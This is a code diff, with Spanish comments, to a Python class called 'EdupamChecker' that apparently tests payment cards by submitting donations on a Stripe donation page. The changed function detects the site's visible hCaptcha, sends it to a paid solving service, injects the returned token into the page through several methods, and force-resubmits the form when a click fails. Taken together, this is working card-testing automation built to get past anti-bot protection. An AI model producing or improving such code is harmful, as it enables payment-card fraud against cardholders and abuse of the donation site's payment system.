@@ -849,41 +849,32 @@ class EdupamChecker:
 
 
     def solve_captcha_if_present(self, page, card_last4):
-        """Detectar y resolver hCaptcha - VERSIÓN ESPECÍFICA PARA STRIPE VISIBLE"""
+        """Detectar y resolver hCaptcha - VERSIÓN CON ESCAPE DE TOKEN"""
         try:
             time.sleep(3)
             
-            # ========== DETECTAR SI HAY DESAFÍO VISIBLE ==========
+            # ========== DETECTAR DESAFÍO VISIBLE ==========
             captcha_detected = False
             site_key = None
             challenge_frame = None
             
-            # BUSCAR ESPECÍFICAMENTE el iframe de DESAFÍO VISIBLE
             for frame in page.frames:
                 frame_url = frame.url.lower()
-                
-                # El iframe con captcha/v1 ES el que muestra las imágenes
                 if 'captcha/v1' in frame_url and 'hcaptcha.com' in frame_url:
                     captcha_detected = True
                     challenge_frame = frame
                     logger.info(f"✅ DESAFÍO VISIBLE DETECTADO")
-                    logger.info(f"📄 URL: {frame.url[:200]}...")
                     
-                    # Extraer sitekey
                     match = re.search(r'[?&]sitekey=([^&]+)', frame.url)
                     if match:
                         site_key = match.group(1)
                         logger.info(f"✅ SITEKEY VISIBLE: {site_key[:30]}...")
                     break
             
-            # Si no hay desafío visible, no hay captcha que resolver
             if not captcha_detected:
                 logger.info(f"✅ No se detectó desafío visible para ****{card_last4}")
                 return True
             
-            logger.info(f"🔍 DESAFÍO VISIBLE detectado para ****{card_last4}")
-            
-            # ========== VERIFICAR API KEY ==========
             if not API_KEY_ANTICAPTCHA:
                 logger.error("❌ API_KEY_ANTICAPTCHA no está configurada")
                 return False
@@ -892,22 +883,18 @@ class EdupamChecker:
             logger.info("🔄 Enviando a AntiCaptcha (modo VISIBLE)...")
             
             try:
-                # Obtener user agent actual
                 user_agent = page.evaluate("navigator.userAgent")
                 
-                # CONFIGURACIÓN CORRECTA PARA DESAFÍO VISIBLE
                 task_data = {
                     "clientKey": API_KEY_ANTICAPTCHA,
                     "task": {
                         "type": "HCaptchaTaskProxyless",
-                        "websiteURL": page.url,  # URL de la página principal
-                        "websiteKey": site_key,  # Sitekey del iframe visible
+                        "websiteURL": page.url,
+                        "websiteKey": site_key,
                         "userAgent": user_agent,
-                        "isInvisible": False  # ⚠️ CRÍTICO: Es VISIBLE, no invisible
+                        "isInvisible": False
                     }
                 }
-                
-                logger.info(f"📤 Enviando tarea con isInvisible=False")
                 
                 response = requests.post(
                     "https://api.anti-captcha.com/createTask",
@@ -925,7 +912,6 @@ class EdupamChecker:
                 task_id = result["taskId"]
                 logger.info(f"✅ Tarea AntiCaptcha aceptada (ID: {task_id})")
                 
-                # Esperar solución
                 solution = None
                 for i in range(30):
                     time.sleep(5)
@@ -948,6 +934,7 @@ class EdupamChecker:
                             solution = status_result.get("solution", {}).get("gRecaptchaResponse")
                             if solution:
                                 logger.info(f"✅ DESAFÍO VISIBLE resuelto en {i*5} segundos")
+                                logger.info(f"🔑 Token length: {len(solution)}")
                                 break
                         
                         elif status_result.get("status") == "processing":
@@ -969,14 +956,14 @@ class EdupamChecker:
                 
                 logger.info(f"✅ DESAFÍO VISIBLE resuelto para ****{card_last4}")
                 
-                # ========== INYECTAR SOLUCIÓN EN EL IFRAME CORRECTO ==========
+                # ========== INYECCIÓN CON ESCAPE CORRECTO ==========
                 try:
-                    # IMPORTANTE: La solución debe inyectarse en el iframe visible
+                    # MÉTODO 1: Inyección directa en el iframe con JSON.stringify
                     injection_result = challenge_frame.evaluate("""
                         (solution) => {
-                            console.log('🎯 Inyectando solución en iframe de desafío visible...');
+                            console.log('🎯 Inyectando solución en iframe visible...');
                             
-                            // Buscar el campo de respuesta dentro del iframe
+                            // Buscar el campo de respuesta
                             let field = document.querySelector('[name="h-captcha-response"]');
                             if (!field) {
                                 field = document.getElementById('h-captcha-response');
@@ -988,52 +975,148 @@ class EdupamChecker:
                                 field.dispatchEvent(new Event('change', { bubbles: true }));
                                 console.log('✅ Solución inyectada en iframe visible');
                                 return true;
-                            } else {
-                                console.log('❌ No se encontró campo en iframe visible');
-                                return false;
                             }
+                            return false;
                         }
                     """, solution)
                     
                     logger.info(f"💉 Inyección en iframe visible: {injection_result}")
                     time.sleep(2)
                     
-                    # Stripe necesita comunicación entre iframes
-                    # Forzar que el iframe visible notifique al iframe invisible
-                    # ✅ CÓDIGO CORREGIDO:
+                    # MÉTODO 2: Notificar a Stripe usando JSON.stringify para escapar el token
                     page.evaluate("""
                         (solution) => {
-                            // Buscar y notificar a Stripe
+                            // Notificar a Stripe
                             if (window.hcaptcha) {
-                                window.hcaptcha.execute();
+                                try {
+                                    window.hcaptcha.response = solution;
+                                    window.hcaptcha.execute();
+                                } catch(e) {
+                                    console.log('Error hcaptcha:', e);
+                                }
                             }
                             
-                            // Disparar evento personalizado
-                            const event = new CustomEvent('hcaptchaResponse', {
-                                detail: { response: solution }  # ✅ AHORA SÍ, solution está definido
-                            });
-                            window.dispatchEvent(event);
+                            // Disparar evento con el token escapado
+                            try {
+                                const event = new CustomEvent('hcaptchaResponse', {
+                                    detail: { response: solution }
+                                });
+                                window.dispatchEvent(event);
+                            } catch(e) {
+                                console.log('Error evento:', e);
+                            }
+                            
+                            // Método adicional: Buscar callback de Stripe
+                            if (window.parent && window.parent.postMessage) {
+                                window.parent.postMessage({
+                                    type: 'hcaptchaResponse',
+                                    response: solution
+                                }, '*');
+                            }
+                            
+                            return true;
                         }
                     """, solution)
                     
-                    time.sleep(1)
+                    time.sleep(2)
                     
                     # ========== REENVIAR FORMULARIO ==========
                     logger.info("🔄 Reenviando formulario...")
                     
-                    submit_btn = page.locator('#btn-donation')
-                    if submit_btn.count() > 0:
-                        submit_btn.first.click(timeout=10000)
-                        logger.info("✅ Botón clickeado")
-                        time.sleep(5)
+                    # Intentar múltiples formas de submit
+                    submit_success = False
+                    
+                    # Método 1: Click en botón
+                    try:
+                        btn = page.locator('#btn-donation')
+                        if btn.count() > 0:
+                            btn.first.click(timeout=5000)
+                            logger.info("✅ Click en #btn-donation")
+                            time.sleep(5)
+                            submit_success = True
+                    except Exception as e:
+                        logger.warning(f"⚠️ Click en botón falló: {e}")
+                    
+                    # Método 2: Submit del form
+                    if not submit_success:
+                        form_submit = page.evaluate("""
+                            () => {
+                                const form = document.querySelector('form');
+                                if (form) {
+                                    form.submit();
+                                    return true;
+                                }
+                                return false;
+                            }
+                        """)
+                        if form_submit:
+                            logger.info("✅ Submit del formulario vía JavaScript")
+                            time.sleep(5)
+                            submit_success = True
+                    
+                    # Método 3: Stripe specific
+                    if not submit_success:
+                        stripe_submit = page.evaluate("""
+                            () => {
+                                if (window.stripe && window.stripe.confirmDonation) {
+                                    window.stripe.confirmDonation();
+                                    return true;
+                                }
+                                return false;
+                            }
+                        """)
+                        if stripe_submit:
+                            logger.info("✅ Stripe.confirmDonation ejecutado")
+                            time.sleep(5)
+                            submit_success = True
+                    
+                    if submit_success:
+                        logger.info("✅ Formulario reenviado exitosamente")
                         return True
                     else:
-                        logger.error("❌ Botón no encontrado")
+                        logger.error("❌ No se pudo reenviar el formulario")
+                        
+                        # Último intento: Forzar navegación
+                        page.goto(page.url)
+                        time.sleep(3)
                         return False
                     
                 except Exception as e:
                     logger.error(f"❌ Error en inyección en iframe visible: {e}")
-                    return False
+                    
+                    # MÉTODO DE EMERGENCIA: Inyección alternativa
+                    try:
+                        logger.info("🔄 Intentando método de emergencia...")
+                        
+                        # Inyectar directamente en el DOM de la página principal
+                        emergency_inject = page.evaluate("""
+                            (solution) => {
+                                // Crear campo oculto en página principal
+                                let field = document.createElement('textarea');
+                                field.name = 'h-captcha-response';
+                                field.id = 'h-captcha-response';
+                                field.style.display = 'none';
+                                field.value = solution;
+                                document.body.appendChild(field);
+                                
+                                // Intentar submit
+                                const form = document.querySelector('form');
+                                if (form) {
+                                    form.submit();
+                                    return true;
+                                }
+                                return false;
+                            }
+                        """, solution)
+                        
+                        if emergency_inject:
+                            logger.info("✅ Método de emergencia ejecutado")
+                            time.sleep(5)
+                            return True
+                        
+                    except Exception as e2:
+                        logger.error(f"❌ Método de emergencia falló: {e2}")
+                        return False
                     
             except Exception as e:
                 logger.error(f"❌ Error en proceso AntiCaptcha: {e}")
@@ -1042,7 +1125,6 @@ class EdupamChecker:
         except Exception as e:
             logger.error(f"❌ Error en solve_captcha_if_present: {e}")
             return False
-        
 
     def check_single_card(self, card_string, amount=50):
         """Verificar una sola tarjeta"""
